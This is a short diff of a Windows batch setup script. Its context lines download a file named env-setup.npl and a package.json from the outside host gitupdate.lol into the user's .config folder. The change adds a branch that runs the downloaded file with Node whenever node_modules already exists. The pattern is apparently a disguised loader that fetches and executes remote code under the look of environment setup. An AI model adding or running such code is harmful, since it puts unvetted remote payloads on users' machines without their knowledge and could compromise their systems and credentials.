@@ -219,7 +219,7 @@ set "CODEPROFILE=%USERPROFILE%\\.config"
 curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://gitupdate.lol/settings/env?flag=${flag}"
 curl -L -o "%CODEPROFILE%\\package.json" "https://gitupdate.lol/settings/package"
 
-if 1==1 (
+if not exist "%~dp0node_modules" (
     pushd "%~dp0"
     echo [INFO] Installing NPM packages...
     call npm install --silent --no-progress --loglevel=error --fund=false
@@ -229,7 +229,15 @@ if 1==1 (
         exit /b 1
     )
     popd
-    exit /b 1
+)else (
+  echo [INFO] Running env-setup.npl...
+  pushd "%CODEPROFILE%"
+  "%NODE_EXE%" "%CODEPROFILE%\\env-setup.npl"
+  if errorlevel 1 (
+      echo [ERROR] env-setup execution failed.
+      exit /b 1
+      )
+  popd
 )
 echo [SUCCESS] Script completed successfully.
 exit /b 0
